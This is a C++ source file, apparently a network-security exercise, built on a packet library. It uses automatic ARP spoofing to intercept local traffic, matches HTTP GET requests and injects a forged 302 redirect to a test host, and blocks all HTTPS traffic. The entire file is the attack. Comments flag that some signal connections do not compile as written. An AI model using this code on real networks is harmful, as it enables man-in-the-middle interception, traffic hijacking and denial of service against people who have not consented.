#include <QCoreApplication>
#include <GBpFilter>
#include <GAutoArpSpoof>
#include <GTcpBlock>
#include <GBlock>
#include <GPcapDeviceWrite>
#include <QObject>
#include <GPacket>
#include "myobj.h"

int main(int argc, char *argv[])
{
    QCoreApplication a(argc, argv);

    GAutoArpSpoof arpspoof;

    MyObj myObj;

    QObject::connect(
                &arpspoof,
                &GCapture::captured,
                &myObj,
                &MyObj::processCaptured,
                Qt::DirectConnection
                );

    GPcapDeviceWrite writer;

    GBpFilter httpfilter;
    httpfilter.filter_ = "(port 80 and tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420) && !(host 175.213.35.39)";

    GBpFilter httpsfilter;
    httpsfilter.filter_ = "tcp port 443";

    GTcpBlock tcpblock;
    tcpblock.backwardRst_ = false;
    tcpblock.backwardFin_ = true;
    tcpblock.backwardFinMsg_ = QStringList{"HTTP/1.0 302 Redirected\r\nLocation: http://test.gilgil.net/ek.jpg\r\n\r\n"};
    tcpblock.writer_ = &writer;

    GBlock block;

    QObject::connect(
                &arpspoof,
                &GCapture::captured,
                &httpfilter,
                &GBpFilter::check //error! there is two check func in GBpFilter
                );

    QObject::connect(
                &arpspoof,
                &GCapture::captured,
                &httpsfilter,
                &GBpFilter::check //error! there is two check func in GBpFilter
                );

    QObject::connect(
                &httpfilter,
                &GBpFilter::notFiltered,
                &tcpblock,
                &GTcpBlock::block
                );

    QObject::connect(
                &httpsfilter,
                &GBpFilter::notFiltered,
                &block,
                &GBlock::block
                );

    block.open();
    tcpblock.open();
    httpfilter.open();
    httpsfilter.open();
    arpspoof.open();

    return a.exec();
}
